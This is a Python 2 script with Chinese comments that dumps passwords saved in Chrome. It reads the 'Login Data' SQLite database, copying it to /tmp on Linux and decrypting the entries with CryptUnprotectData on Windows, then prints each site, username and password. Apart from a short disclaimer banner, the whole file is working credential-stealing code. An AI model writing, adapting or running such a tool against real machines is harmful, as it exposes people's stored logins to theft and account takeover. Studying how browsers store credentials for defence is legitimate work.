#!/usr/bin/env python
# coding: utf-8
import sqlite3
import os
import platform

# 获取Chrome浏览器上保存的密码
# ========================
# Chrome将保存的密码存放在sqlite数据库中，默认位于：
#
# Linux:
# 	~/.config/google-chrome/Default/Login Data
# Windows:
# 	%APPDATA%\..\Local\Google\Chrome\User Data\Default\Login Data
# Windows XP:
# 	[系统盘]:\Documents and Settings\[用户名]\Local Settings\Application Data\Google\Chrome\User Data\Default\Login Data
#
# 在Linux上，密码处于裸奔的状态。
# 而在windows上，chrome调用Windows API函数CryptProtectData来简单加密密码。

L=30
def banner():
	print '#'*L
	print '#  Chrome Browser Passwords  #'
	print '#                            #'
	print '#  Author: Eular             #'
	print '#  Version 1.0               #'
	print '#'*L
	print '\033[31mWarning:\033[0m We do not condone the use of these or any other form of attack to gainunauthorized access to any system resources.'
	print '(Press any key to continue...)'
	raw_input()

def printOutResult(site,username,password):
	print 'Site:',site
	print 'User:',username
	print 'Pswd:',password
	print '='*L

def sqliteQuery(file_path,query_sql):
	conn=sqlite3.connect(file_path)
	cursor=conn.cursor()
	cursor.execute(query_sql)
	return cursor

def LookChromePasswd():
	PLATFORM=platform.system()

	if PLATFORM=='Linux':
		chrome_passwd_path=os.getenv('HOME')+'/.config/google-chrome/Default/Login\ Data'

		# 由于sqlite对数据库做修改操作时会做(文件)锁使得其它进程同一时间使用时会报错误。
		# 为了以防万一，我们不对原文件进行操作。
		tmp_path='/tmp/LoginData'
		cmd_cp='cp %s %s' % (chrome_passwd_path,tmp_path)
		os.system(cmd_cp)

		query_sql='SELECT action_url,username_value,password_value FROM logins'
		cursor=sqliteQuery(tmp_path,query_sql)

		# Print out the result
		for r in cursor.fetchall():
			site=r[0]
			username='\033[31m'+r[1].encode('utf-8')+'\033[0m'
			password=r[2]
			printOutResult(site,username,password)

		# Delete the file
		cmd_rm='rm %s' % tmp_path
		os.system(cmd_rm)

	elif PLATFORM=='Windows':
		import win32crypt
		chrome_passwd_path=os.getenv('APPDATA')+'\..\Local\Google\Chrome\User Data\Default\Login Data'
		
		query_sql='SELECT action_url,username_value,password_value FROM logins'
		cursor=sqliteQuery(chrome_passwd_path,query_sql)

		# Print out the result
		for r in cursor.fetchall():
			site=r[0]
			username='\033[31m'+r[1]+'\033[0m'

			# 由于chrome的保护机制
			# 当你重设了Windows账号密码，随后尝试在Chrome中查看你的密码，密码数据都是不可用，因为“主密码”并不匹配。
			# 同样的，如果把SQLite数据库文件复制，并尝试在另外一台电脑上打开，也一样无法查看。
			try:
				password=win32crypt.CryptUnprotectData(r[2], None, None, None, 0)[1]
			except Exception, e:
				print '错误：主密码不匹配'
				print '可能原因：Windows账号密码遭重设或SQLite数据库尝试在另外一台电脑上打开'

			printOutResult(site,username,password)

if __name__=='__main__':
	banner()
	LookChromePasswd()